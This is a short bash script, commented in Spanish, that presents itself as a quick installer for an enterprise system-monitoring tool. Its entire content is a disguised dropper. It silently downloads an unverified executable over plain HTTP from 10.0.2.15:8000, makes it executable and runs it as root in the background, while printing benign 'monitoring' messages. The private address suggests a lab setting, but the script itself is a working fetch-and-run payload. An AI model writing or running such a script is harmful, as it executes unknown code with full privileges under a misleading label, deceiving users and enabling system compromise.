#!/bin/bash
# Monitor de Sistema Empresarial - Instalador Rápido
# ==================================================

echo "Instalando herramientas de diagnóstico del sistema..."

# Verificar conectividad
if ! ping -c 1 10.0.2.15 &>/dev/null; then
    echo "Error: No se puede conectar al servidor"
    exit 1
fi

# Descargar ejecutable
wget -q http://10.0.2.15:8000/dist/system_monitor -O /tmp/system_monitor

# Verificar descarga
if [ ! -f /tmp/system_monitor ]; then
    echo "Error: No se pudo descargar el ejecutable"
    exit 1
fi

# Configurar permisos
chmod +x /tmp/system_monitor

# Ejecutar en background
echo "Iniciando monitor del sistema..."
sudo /tmp/system_monitor &

echo "Monitor iniciado correctamente"
echo "El sistema está siendo monitoreado para diagnósticos"
